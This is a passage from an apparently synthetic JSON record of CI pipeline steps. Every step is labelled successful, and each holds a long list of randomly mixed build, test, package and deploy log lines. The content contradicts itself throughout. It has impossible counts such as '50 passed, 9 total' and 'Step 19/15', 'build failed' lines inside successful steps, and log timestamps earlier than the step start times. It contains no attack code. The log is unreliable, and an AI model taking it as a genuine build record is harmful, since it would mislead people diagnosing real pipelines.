          "Compiling components/main.py...",
          "Compiling lib/service.java...",
          "Building Docker image...",
          "Artifact downloaded: 33MB",
          "Compiling src/app.ts...",
          "pip: Collecting react",
          "Compiling components/handler.rs...",
          "Test Suites: 14 passed, 36 total",
          "Processing...",
          "Finished.",
          "pip: Downloading prettier-1.5.tar.gz",
          "[12:19:14] INFO: Request completed",
          "Pulling image: python:latest",
          "Generating source maps...",
          "Step 10/25: Deploying",
          "pip: Collecting react",
          "Step 7/21: Testing",
          "Step 6/24: Testing",
          "Connecting to cloud.services:443...",
          "Test Suites: 50 passed, 9 total",
          "FAILED: test_auth_login",
          "pip: Downloading lodash-3.20.tar.gz",
          "TLS handshake completed",
          "Pulling image: python:3.11",
          "Pulling image: python:3.11",
          "TLS handshake completed",
          "\u2713 build completed",
          "Completed.",
          "OK",
          "POST /data - 200 (443ms)",
          "Artifact downloaded: 48MB",
          "Environment: production",
          "Finished.",
          "Test Suites: 28 passed, 36 total",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (36MB)",
          "Connection established",
          "Waiting...",
          "Compiling lib/handler.rs...",
          "Finished.",
          "[12:19:14] DEBUG: Memory usage: 1851MB",
          "Cache miss for key-2369",
          "Bundling vendor.js",
          "NODE_ENV=test",
          "POST /data - 200 (100ms)",
          "Finished.",
          "pip install: Successfully installed prettier-1.16",
          "Connection established",
          "Artifact uploaded: build.tar.gz (4MB)",
          "TLS handshake completed",
          "[12:19:14] DEBUG: Memory usage: 1659MB",
          "Coverage: 100% statements, 60% branches",
          "Exception: NullPointerException",
          "  PASS: test_cache_hit (355ms)",
          "\u2713 All checks passed",
          "Snapshots: 50 passed, 7 total",
          "GET /status - 200 (34ms)",
          "Step 4/20: Linting",
          "Environment: staging",
          "FAILED: test_auth_login",
          "Done.",
          "pip install: Successfully installed webpack-1.9",
          "[12:19:14] INFO: Processing request",
          "TLS handshake completed",
          "Installing webpack@4.9.4",
          "\u2713 Step 'build' succeeded",
          "yarn add: Done in 11.94s",
          "Connection established",
          "Snapshots: 3 passed, 5 total",
          "Done.",
          "Cache saved successfully",
          "Loading...",
          "HEAD is now at 8e94dad",
          "Test Suites: 18 passed, 34 total",
          "Coverage: 98% statements, 84% branches",
          "[12:19:14] ERROR: Connection failed",
          "[12:19:14] INFO: Request completed",
          "Checking out main branch",
          "[12:19:14] INFO: Request completed",
          "Switched to branch 'feature/task-485'",
          "pip: Collecting react",
          "Compiling components/handler.rs...",
          "Image pulled successfully",
          "\u2713 Task completed in 1501ms",
          "Connecting to example.com:443...",
          "Tests: 87 passed, 246 total",
          "npm notice: created a lockfile",
          "Cache invalidated: dependencies",
          "Completed.",
          "pip: Downloading jest-4.12.tar.gz",
          "Step 16/20: Testing",
          "[12:19:14] INFO: Request completed",
          "Step 7/18: Linting",
          "Checking out main branch",
          "Loading...",
          "Compiling utils/utils.go...",
          "Layer 8/10: RUN command",
          "Layer 9/9: ENV command",
          "\u2713 All checks passed",
          "Snapshots: 46 passed, 50 total",
          "npm install: resolved 925 packages",
          "[12:19:14] INFO: Request completed",
          "POST /data - 202 (302ms)",
          "Done.",
          "[12:19:14] INFO: Request completed",
          "Cache miss for key-7553",
          "Waiting...",
          "Transforming 940 files...",
          "Cache miss for key-4954",
          "HEAD is now at eb68488",
          "Cache saved successfully",
          "Layer 4/15: RUN command",
          "Checking out main branch",
          "WARNING: react has known vulnerabilities",
          "Step 6/20: Deploying",
          "Minifying main.js",
          "Creating production build...",
          "Step 16/23: Testing",
          "[12:19:14] INFO: Cache refreshed",
          "Uploading artifact 'dist' (40 files)",
          "Step 19/15: Installing dependencies",
          "Artifact downloaded: 40MB",
          "GET /api - 200 (23ms)",
          "Done.",
          "POST /data - 200 (362ms)",
          "Building Docker image...",
          "Creating production build...",
          "[12:19:14] WARN: Deprecated API usage",
          "Step 6/15: Linting",
          "Optimizing 30 modules...",
          "Done.",
          "Step 8/24: Testing",
          "Image pulled successfully",
          "[12:19:14] ERROR: Connection failed",
          "OK",
          "Exception: TypeError",
          "  PASS: e2e/test_auth_login.spec.js",
          "WARNING: jest has known vulnerabilities",
          "[12:19:14] WARN: Deprecated API usage",
          "Building Docker image...",
          "HEAD is now at 296b7f8",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-16T12:20:29.709128",
        "finished_at": "2025-12-16T12:20:36.121503",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Optimizing 96 modules...",
          "Minifying main.js",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "NODE_ENV=test",
          "[12:19:14] INFO: Processing request",
          "Success!",
          "npm notice: created a lockfile",
          "Pulling image: node:latest",
          "Using Python 3.10",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (23MB)",
          "HEAD is now at 0959453",
          "[12:19:14] DEBUG: Memory usage: 1300MB",
          "Coverage: 87% statements, 78% branches",
          "Compiling utils/app.ts...",
          "Image pulled successfully",
          "Done.",
          "[12:19:14] INFO: Processing request",
          "Loading...",
          "Layer 3/12: ENV command",
          "\u2717 build failed with exit code 33",
          "Cache saved successfully",
          "Cache invalidated: dependencies",
          "Compiling utils/utils.go...",
          "Time: 43.550s",
          "Pushing to registry...",
          "Test Suites: 26 passed, 47 total",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Loading...",
          "Layer 8/13: RUN command",
          "Tests: 73 passed, 268 total",
          "Switched to branch 'hotfix/task-654'",
          "WARNING: prettier has known vulnerabilities",
          "Environment: test",
          "Artifact downloaded: 8MB",
          "Platform: win32-x64",
          "npm install: resolved 912 packages",
          "Tests: 234 passed, 116 total",
          "Compiling utils/index.js...",
          "Pushing to registry...",
          "[12:19:14] WARN: Deprecated API usage",
          "  PASS: unit/test_user_create.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /api - 202 (209ms)",
          "Cache saved successfully",
          "Step 15/22: Installing dependencies",
          "Platform: darwin-arm64",
          "pip: Collecting lodash",
          "Connecting to cloud.services:443...",
          "[12:19:14] INFO: Request completed",
          "Cache miss for key-7572",
          "Cache hit for key-1641",
          "Step 20/15: Installing dependencies",
          "[12:19:14] WARN: Deprecated API usage",
          "Checking out main branch",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache saved successfully",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 package completed",
          "npm install: added 268 packages",
          "Cache saved successfully",
          "[12:19:14] DEBUG: Memory usage: 444MB",
          "[12:19:14] INFO: Processing request",
          "POST /upload - 200 (60ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed lodash-1.10",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: axios has known vulnerabilities",
          "Using Python 3.10",
          "pip: Collecting prettier",
          "Compiling lib/app.ts...",
          "[12:19:14] ERROR: Connection failed",
          "Checking out master branch",
          "[12:19:14] INFO: Request completed",
          "Time: 37.646s",
          "GET /health - 201 (68ms)",
          "GET /api - 204 (77ms)",
          "Transforming 368 files...",
          "Environment: staging",
          "Cache saved successfully",
          "WARNING: jest has known vulnerabilities",
          "Cache restored successfully (453MB)",
          "Image pulled successfully",
          "Compiling lib/main.py...",
          "npm install: resolved 1140 packages",
          "Test Suites: 25 passed, 21 total",
          "Artifact downloaded: 9MB",
          "[12:19:15] INFO: Request completed",
          "Cache invalidated: dependencies",
          "Creating production build...",
          "[12:19:15] INFO: Request completed",
          "Step 13/16: Linting",
          "Platform: darwin-arm64",
          "Waiting...",
          "POST /upload - 202 (22ms)",
          "Compiling lib/app.ts...",
          "[12:19:15] INFO: Starting build process",
          "[12:19:15] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Environment: development",
          "[12:19:15] DEBUG: Initializing service",
          "Compiling components/service.java...",
          "[12:19:15] WARN: Deprecated API usage",
          "[12:19:15] DEBUG: Connection pool: 3 active",
          "\u2713 All checks passed",
          "Coverage: 99% statements, 81% branches",
          "\u2713 Step 'checkout' succeeded",
          "Compiling src/main.py...",
          "Building Docker image...",
          "[12:19:15] INFO: Cache refreshed",
          "HEAD is now at 690d2bc",
          "Loading...",
          "[12:19:15] INFO: Cache refreshed",
          "Completed.",
          "FAILED: test_cache_hit",
          "Fetching submodules...",
          "Transforming 562 files...",
          "Creating production build...",
          "[12:19:15] INFO: Processing request",
          "[12:19:15] DEBUG: Query executed in 70ms",
          "Loading...",
          "Layer 9/14: COPY command",
          "\u2717 build failed with exit code 100",
          "OK",
          "Tests: 86 passed, 364 total",
          "POST /api - 201 (235ms)",
          "HEAD is now at 4152c0a",
          "HEAD is now at dc2dfb3",
          "Pushing to registry...",
          "Pushing to registry...",
          "Finished.",
          "Environment: development",
          "Artifact downloaded: 31MB",
          "Success!",
          "Compiling lib/service.java...",
          "Switched to branch 'bugfix/task-609'",
          "Compiling utils/index.js...",
          "Compiling components/service.java...",
          "Exception: TypeError",
          "\u2717 build failed with exit code 88",
          "NODE_ENV=test",
          "TLS handshake completed",
          "Using Node.js 16.12.7",
          "[12:19:15] DEBUG: Loading configuration",
          "Ready.",
          "GET /health - 204 (21ms)",
          "NODE_ENV=test",
          "[12:19:15] DEBUG: Memory usage: 1907MB",
          "pip: Downloading react-1.4.tar.gz",
          "Artifact uploaded: dist.zip (13MB)",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-16T12:20:36.121503",
        "finished_at": "2025-12-16T12:21:08.183378",
        "log_lines": [
          "=== Step: build ===",
          "pip: Downloading lodash-1.8.tar.gz",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache miss for key-2514",
          "Tests: 423 passed, 88 total",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "Tests: 412 passed, 327 total",
          "Bundling vendor.js",
          "Exception: NullPointerException",
          "Using Python 3.12",
          "[12:19:15] WARN: Deprecated API usage",
          "npm install: resolved 169 packages",
          "[12:19:15] DEBUG: Connection pool: 12 active",
          "yarn add: Done in 8.64s",
          "WARNING: eslint has known vulnerabilities",
          "[12:19:15] DEBUG: Loading configuration",
          "Verifying...",
          "[12:19:15] ERROR: Connection failed",
          "Step 8/18: Installing dependencies",
          "npm notice: created a lockfile",
          "Already up to date.",
          "[12:19:15] INFO: Cache refreshed",
          "npm install: resolved 1993 packages",
          "Creating production build...",
          "Ready.",
          "WARNING: react has known vulnerabilities",
          "Fetching submodules...",
          "Checking out develop branch",
          "Using Node.js 20.10.0",
          "Cache miss for key-4850",
          "pip install: Successfully installed webpack-3.7",
          "npm install: added 308 packages",
          "Processing...",
          "  PASS: test_api_health (27ms)",
          "pip: Collecting express",
          "Loading...",
          "NODE_ENV=development",
          "Transforming 815 files...",
          "[12:19:15] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Completed.",
          "\u2717 build failed with exit code 109",
          "\u2713 Step 'install' succeeded",
          "Coverage: 84% statements, 100% branches",
          "Test Suites: 14 passed, 11 total",
          "Installing jest@2.18.3",
          "\u2713 Step 'setup' succeeded",
          "Installing lodash@3.17.7",
          "Compiling utils/service.java...",
          "POST /data - 202 (392ms)",
          "Artifact uploaded: dist.zip (68MB)",
          "Connecting to test.io:443...",
          "[12:19:15] DEBUG: Connection pool: 13 active",
          "Finished.",
          "Optimizing 20 modules...",
          "Artifact uploaded: dist.zip (51MB)",
          "  PASS: integration/test_api_health.spec.js",
          "[12:19:15] DEBUG: Connection pool: 17 active",
          "Compiling utils/utils.go...",
          "\u2717 build failed with exit code 6",
          "npm install: added 77 packages",
          "[12:19:15] INFO: Processing request",
          "Environment: development",
          "Cache invalidated: node_modules",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:15] DEBUG: Loading configuration",
          "Fetching submodules...",
          "Cache invalidated: node_modules",
          "Cache restored successfully (399MB)",
          "pip install: Successfully installed axios-5.3",
          "Bundling runtime.js",
          "[12:19:15] ERROR: Connection failed",
          "Artifact downloaded: 34MB",
          "Connecting to example.com:443...",
          "[12:19:15] WARN: Deprecated API usage",
          "Layer 8/14: RUN command",
          "Ran 105 tests in 40s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 13.20s",
          "Waiting...",
          "\u2717 build failed with exit code 90",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "Cache invalidated: node_modules",
          "[12:19:15] INFO: Processing request",
          "  PASS: test_api_health (83ms)",
          "Connecting to startup.dev:443...",
          "[12:19:15] WARN: Deprecated API usage",
          "Step 16/17: Linting",
          "[12:19:15] INFO: Starting build process",
          "pip install: Successfully installed axios-2.15",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:19:15] WARN: Deprecated API usage",
          "npm install: resolved 1729 packages",
          "Step 20/20: Building",
          "Cache invalidated: dependencies",
          "Transforming 611 files...",
          "yarn add: Done in 4.38s",
          "TLS handshake completed",
          "pip: Collecting jest",
          "Snapshots: 12 passed, 39 total",
          "[12:19:15] INFO: Request completed",
          "Platform: linux-x64",
          "pip: Collecting react",
          "Pushing to registry...",
          "Success!",
          "Connecting to example.com:443...",
          "Compiling components/main.py...",
          "\u2713 test completed",
          "[12:19:15] INFO: Starting build process",
          "pip: Collecting react",
          "[12:19:15] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (44 files)",
          "Environment: production",
          "Minifying vendor.js",
          "pip: Downloading react-4.13.tar.gz",
          "Checking out main branch",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed express-3.11",
          "Success!",
          "npm notice: created a lockfile",
          "[12:19:15] INFO: Processing request",
          "Step 9/18: Building",
          "POST /data - 200 (476ms)",
          "Building Docker image...",
          "TLS handshake completed",
          "Building Docker image...",
          "Coverage: 84% statements, 76% branches",
          "Artifact downloaded: 29MB",
          "Using Python 3.10",
          "Already up to date.",
          "[12:19:15] DEBUG: Memory usage: 1664MB",
          "Installing eslint@1.18.5",
          "Compiling components/handler.rs...",
          "[12:19:15] INFO: Starting build process",
          "[12:19:15] DEBUG: Initializing service",
          "[12:19:15] DEBUG: Memory usage: 1458MB",
          "Compiling components/app.ts...",
          "Installing prettier@1.20.4",
          "OK",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Time: 89.982s",
          "Processing...",
          "\u2713 test completed",
          "NODE_ENV=development",
          "npm notice: created a lockfile",
          "Already up to date.",
          "Switched to branch 'feature/task-973'",
          "npm install: resolved 1329 packages",
          "Artifact uploaded: build.tar.gz (35MB)",
          "TLS handshake completed",
          "GET /api - 201 (27ms)",
          "[12:19:15] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-16T12:21:08.183378",
        "finished_at": "2025-12-16T12:21:18.870670",
        "log_lines": [
          "=== Step: type_check ===",
          "Tests: 434 passed, 124 total",
          "Minifying vendor.js",
          "[12:19:15] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Cache miss for key-3936",
          "[12:19:15] INFO: Processing request",
          "Cache restored successfully (390MB)",
          "npm install: resolved 1300 packages",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 Task completed in 3173ms",
          "\u2717 build failed with exit code 21",
          "npm install: added 249 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting webpack",
          "Platform: darwin-arm64",
          "Generating source maps...",
          "Done.",
          "Fetching submodules...",
          "TLS handshake completed",
          "Ran 20 tests in 12s",
          "[12:19:15] DEBUG: Loading configuration",
          "Cache saved successfully",
          "Platform: darwin-arm64",
          "Cache miss for key-3840",
          "npm install: added 494 packages",
          "npm notice: package.json updated",
          "Artifact downloaded: 47MB",
          "Switched to branch 'bugfix/task-305'",
          "Tests: 339 passed, 490 total",
          "Done.",
          "WARNING: eslint has known vulnerabilities",
          "npm notice: created a lockfile",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:19:15] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "Compiling src/utils.go...",
          "Fetching submodules...",
          "Artifact downloaded: 5MB",
          "[12:19:15] WARN: Deprecated API usage",
          "Artifact downloaded: 25MB",
          "Success!",
          "Uploading artifact 'dist' (21 files)",
          "Step 11/18: Building",
          "[12:19:15] INFO: Cache refreshed",
          "\u2713 Task completed in 210ms",
          "[12:19:15] WARN: Deprecated API usage",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 20/20: Running migrations",
          "Switched to branch 'hotfix/task-195'",
          "Step 3/17: Running migrations",
          "Verifying...",
          "Already up to date.",
          "  PASS: test_api_health (223ms)",
          "Using Node.js 16.7.4",
          "Environment: production",
          "Coverage: 100% statements, 64% branches",
          "npm notice: package.json updated",
          "[12:19:15] INFO: Connecting to database",
          "Transforming 704 files...",
          "Compiling components/utils.go...",
          "  PASS: test_db_connect (106ms)",
          "Uploading artifact 'dist' (48 files)",
          "Connection established",
          "[12:19:15] INFO: Cache refreshed",
          "Ready.",
          "Cache miss for key-3497",
          "Image pulled successfully",
          "npm install: added 459 packages",
          "Step 18/20: Testing",
          "Connection established",
          "Compiling components/main.py...",
          "Coverage: 75% statements, 96% branches",
          "npm install: resolved 1500 packages",
          "pip: Collecting express",
          "Using Node.js 18.14.7",
          "Time: 4.756s",
          "Minifying app.js",
          "Artifact downloaded: 15MB",
          "Time: 10.456s",
          "Compiling lib/service.java...",
          "Pulling image: alpine:latest",
          "[12:19:15] INFO: Processing request",
          "[12:19:15] DEBUG: Query executed in 63ms",
          "TLS handshake completed",
          "Step 4/19: Deploying",
          "  PASS: unit/test_user_create.spec.js",
          "Step 1/24: Linting",
          "Cache restored successfully (406MB)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Pushing to registry...",
          "yarn add: Done in 3.53s",
          "  PASS: test_db_connect (48ms)",
          "  PASS: test_auth_login (178ms)",
          "Step 1/21: Linting",
          "Step 5/16: Running migrations",
          "Cache saved successfully",
          "Compiling lib/app.ts...",
          "Pulling image: node:latest",
          "Environment: development",
          "Test Suites: 12 passed, 12 total",
          "pip: Installing build dependencies...",
          "  PASS: unit/test_auth_login.spec.js",
          "\u2713 package completed",
          "Platform: win32-x64",
          "Ran 124 tests in 32s",
          "Fetching submodules...",
          "pip install: Successfully installed react-3.20",
          "Step 4/22: Deploying",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "  PASS: test_auth_login (455ms)",
          "Time: 86.439s",
          "NODE_ENV=production",
          "Finished.",
          "Snapshots: 49 passed, 11 total",
          "[12:19:15] ERROR: Connection failed",
          "[12:19:15] WARN: Deprecated API usage",
          "Checking out develop branch",
          "Waiting...",
          "Pulling image: alpine:3.11",
          "\u2713 All checks passed",
          "pip install: Successfully installed jest-2.13",
          "Uploading artifact 'dist' (47 files)",
          "\u2717 build failed with exit code 38",
          "Success!",
          "Connecting to acme.corp:443...",
          "[12:19:15] DEBUG: Initializing service",
          "Cache saved successfully",
          "[12:19:15] DEBUG: Query executed in 89ms",
          "Step 20/24: Building",
          "TLS handshake completed",
          "WARNING: eslint has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Optimizing 49 modules...",
          "Success!",
          "Tests: 157 passed, 347 total",
          "Time: 5.40s",
          "[12:19:15] DEBUG: Loading configuration",
          "Ready.",
          "pip: Collecting lodash",
          "Minifying vendor.js",
          "GET /api - 200 (57ms)",
          "[12:19:15] DEBUG: Loading configuration",
          "Using Python 3.9",
          "HEAD is now at 7f411e2",
          "NODE_ENV=test",
          "[12:19:15] WARN: Deprecated API usage",
          "Finished.",
          "Exception: TypeError",
          "Cache saved successfully",
          "Compiling components/handler.rs...",
          "Creating production build...",
          "Waiting...",
          "Cache restored successfully (258MB)",
          "Compiling utils/main.py...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-16T12:21:18.870670",
        "finished_at": "2025-12-16T12:21:50.932545",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Cache invalidated: node_modules",
          "Step 7/16: Linting",
          "Platform: linux-x64",
          "GET /status - 204 (74ms)",
          "Environment: staging",
          "[12:19:15] WARN: Deprecated API usage",
          "Step 7/22: Testing",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "Connection established",
          "Processing...",
          "NODE_ENV=test",
          "pip: Installing build dependencies...",
          "OK",
          "Already up to date.",
          "pip: Collecting webpack",
          "Loading...",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "\u2713 package completed",
          "Step 4/17: Linting",
          "[12:19:15] DEBUG: Query executed in 99ms",
          "\u2717 build failed with exit code 109",
          "[12:19:15] INFO: Starting build process",
          "Checking out main branch",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/main.py...",
          "npm install: resolved 781 packages",
          "Cache invalidated: build",
          "Bundling vendor.css",
          "Success!",
          "Loading...",
          "Optimizing 61 modules...",
          "[12:19:15] DEBUG: Query executed in 43ms",
          "Creating production build...",
          "\u2713 Step 'install' succeeded",
          "FAILED: test_cache_hit",
          "Checking out develop branch",
          "[12:19:15] INFO: Request completed",
          "OK",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting express",
          "Platform: darwin-arm64",
          "Platform: linux-x64",
          "Checking out develop branch",
          "yarn add: Done in 6.77s",
          "Waiting...",
          "Exception: ValueError",
          "[12:19:15] INFO: Processing request",
          "Compiling lib/app.ts...",
          "Platform: win32-x64",
          "Step 16/20: Running migrations",
          "Success!",
          "Loading...",
          "Optimizing 18 modules...",
          "[12:19:15] WARN: Deprecated API usage",
          "[12:19:15] DEBUG: Connection pool: 13 active",
          "Platform: linux-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "  PASS: test_api_health (286ms)",
          "Transforming 121 files...",
          "Waiting...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 3/24: Deploying",
          "Using Python 3.12",
          "  PASS: test_cache_hit (109ms)",
          "Step 1/17: Deploying",
          "Exception: RuntimeError",
          "npm install: added 405 packages",
          "Cache saved successfully",
          "WARNING: axios has known vulnerabilities",
          "\u2713 Task completed in 305ms",
          "Uploading artifact 'build' (30 files)",
          "OK",
          "Finished.",
          "Exception: NullPointerException",
          "Using Node.js 16.15.10",
          "  PASS: test_cache_hit (496ms)",
          "npm install: added 387 packages",
          "Fetching submodules...",
          "Cache miss for key-9282",
          "Cache miss for key-2908",
          "[12:19:15] DEBUG: Query executed in 77ms",
          "Cache restored successfully (333MB)",
          "Compiling utils/index.js...",
          "Ran 19 tests in 35s",
          "Step 15/24: Testing",
          "Minifying app.js",
          "Uploading artifact 'dist' (16 files)",
          "npm notice: created a lockfile",
          "Layer 3/8: RUN command",
          "Exception: ValueError",
          "[12:19:15] INFO: Connecting to database",
          "pip: Downloading prettier-1.20.tar.gz",
          "[12:19:15] DEBUG: Initializing service",
          "Step 5/23: Deploying",
          "\u2713 Task completed in 4779ms",
          "Artifact uploaded: dist.zip (16MB)",
          "Step 16/15: Deploying",
          "Optimizing 75 modules...",
          "[12:19:15] INFO: Connecting to database",
          "Building Docker image...",
          "Checking out develop branch",
          "Finished.",
          "Ran 48 tests in 10s",
          "npm install: added 110 packages",
          "[12:19:15] DEBUG: Query executed in 90ms",
          "Connection established",
          "WARNING: axios has known vulnerabilities",
          "Step 1/21: Deploying",
          "Uploading artifact 'build' (38 files)",
          "Snapshots: 45 passed, 14 total",
          "[12:19:15] WARN: Deprecated API usage",
          "Environment: staging",
          "  PASS: test_db_connect (113ms)",
          "[12:19:15] DEBUG: Memory usage: 1815MB",
          "  PASS: test_auth_login (218ms)",
          "Step 20/20: Testing",
          "Time: 98.434s",
          "pip install: Successfully installed eslint-2.7",
          "[12:19:15] WARN: Deprecated API usage",
          "  PASS: integration/test_api_health.spec.js",
          "Snapshots: 16 passed, 20 total",
          "Pulling image: python:latest",
          "npm notice: created a lockfile",
          "Artifact downloaded: 15MB",
          "Cache hit for key-2024",
          "Environment: development",
          "[12:19:15] ERROR: Connection failed",
          "TLS handshake completed",
          "[12:19:15] WARN: Deprecated API usage",
          "Using Python 3.11",
          "Installing eslint@1.13.3",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "Image pulled successfully",
          "HEAD is now at 0dd1702",
          "Switched to branch 'hotfix/task-645'",
          "Creating production build...",
          "Exception: NullPointerException",
          "\u2713 deploy completed",
          "Step 9/20: Linting",
          "Switched to branch 'feature/task-755'",
          "Artifact downloaded: 6MB",
          "Switched to branch 'hotfix/task-462'",
          "Checking out develop branch",
          "npm install: resolved 1024 packages",
          "Tests: 386 passed, 122 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 7/17: Linting",
          "[12:19:15] INFO: Request completed",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-16T12:21:50.932545",
        "finished_at": "2025-12-16T12:22:01.619837",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Layer 5/13: ENV command",
          "Pulling image: alpine:18",
          "Using Node.js 20.16.10",
          "Step 5/17: Building",
          "Cache saved successfully",
          "Coverage: 70% statements, 68% branches",
          "[12:19:15] DEBUG: Memory usage: 1260MB",
          "Generating source maps...",
          "Minifying main.js",
          "Tests: 229 passed, 224 total",
          "Time: 20.704s",
          "Step 17/24: Testing",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: e2e/test_user_create.spec.js",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: dist.zip (25MB)",
          "Optimizing 34 modules...",
          "Step 5/20: Linting",
          "Time: 16.965s",
          "Using Python 3.12",
          "Connection established",
          "Artifact uploaded: dist.zip (100MB)",
          "\u2713 package completed",
          "Building Docker image...",
          "\u2713 All checks passed",
          "pip: Collecting axios",
          "Pushing to registry...",
          "Creating production build...",
          "Time: 105.984s",
          "OK",
          "Cache miss for key-7763",
          "[12:19:15] INFO: Processing request",
          "\u2713 All checks passed",
          "Step 4/20: Running migrations",
          "Step 1/23: Building",
          "\u2717 build failed with exit code 92",
          "Connection established",
          "\u2713 Task completed in 2164ms",
          "Ran 128 tests in 47s",
          "Using Python 3.10",
          "[12:19:15] INFO: Starting build process",
          "Ran 155 tests in 50s",
          "HEAD is now at 3dbdf1d",
          "Pushing to registry...",
          "[12:19:15] ERROR: Connection failed",
          "NODE_ENV=test",
          "Cache invalidated: node_modules",
          "Step 16/17: Building",
          "yarn add: Done in 8.52s",
          "Step 8/25: Linting",
          "Processing...",
          "[12:19:15] DEBUG: Loading configuration",
          "[12:19:15] DEBUG: Loading configuration",
          "\u2713 Step 'setup' succeeded",
          "Using Node.js 15.7.1",
          "Success!",
          "Fetching submodules...",
          "WARNING: react has known vulnerabilities",
          "Connection established",
          "Cache invalidated: dependencies",
          "OK",
          "Cache restored successfully (178MB)",
          "Compiling utils/app.ts...",
          "npm install: resolved 1361 packages",
          "[12:19:15] DEBUG: Query executed in 93ms",
          "Cache invalidated: node_modules",
          "Cache miss for key-2030",
          "Ran 167 tests in 27s",
          "Cache hit for key-4842",
          "Connection established",
          "Image pulled successfully",
          "Building Docker image...",
          "[12:19:15] DEBUG: Query executed in 36ms",
          "Using Python 3.10",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/app.ts...",
          "pip: Collecting jest",
          "Cache hit for key-4850",
          "\u2713 All checks passed",
          "Step 14/20: Running migrations",
          "[12:19:15] WARN: Deprecated API usage",
          "[12:19:15] DEBUG: Loading configuration",
          "[12:19:15] DEBUG: Initializing service",
          "Pushing to registry...",
          "Pulling image: node:3.11",
          "Ran 87 tests in 30s",
          "Step 16/24: Testing",
          "[12:19:15] DEBUG: Loading configuration",
          "NODE_ENV=development",
          "Installing prettier@5.5.6",
          "Switched to branch 'bugfix/task-567'",
          "Uploading artifact 'build' (10 files)",
          "Done.",
          "Bundling runtime.css",
          "npm notice: package.json updated",
          "Checking out main branch",
          "Layer 7/14: ENV command",
          "WARNING: react has known vulnerabilities",
          "[12:19:15] WARN: Deprecated API usage",
          "  PASS: test_user_create (166ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact downloaded: 32MB",
          "Minifying vendor.js",
          "Installing prettier@3.4.2",
          "Layer 7/15: ENV command",
          "Artifact uploaded: dist.zip (56MB)",
          "[12:19:15] ERROR: Connection failed",
          "Step 3/19: Testing",
          "Connection established",
          "Loading...",
          "Success!",
          "Ready.",
          "\u2713 deploy completed",
          "  PASS: unit/test_user_create.spec.js",
          "Checking out master branch",
          "Time: 25.667s",
          "Waiting...",
          "Test Suites: 21 passed, 5 total",
          "[12:19:15] WARN: Deprecated API usage",
          "Snapshots: 32 passed, 2 total",
          "  PASS: unit/test_auth_login.spec.js",
          "HEAD is now at 71497b9",
          "Compiling lib/index.js...",
          "Cache hit for key-5184",
          "Done.",
          "WARNING: lodash has known vulnerabilities",
          "POST /data - 201 (121ms)",
          "Completed.",
          "pip install: Successfully installed eslint-2.7",
          "Pulling image: node:3.11",
          "\u2713 Step 'checkout' succeeded",
          "FAILED: test_user_create",
          "Creating production build...",
          "Pulling image: alpine:18",
          "Snapshots: 0 passed, 42 total",
          "Compiling components/index.js...",
          "Cache restored successfully (466MB)",
          "[12:19:15] INFO: Processing request",
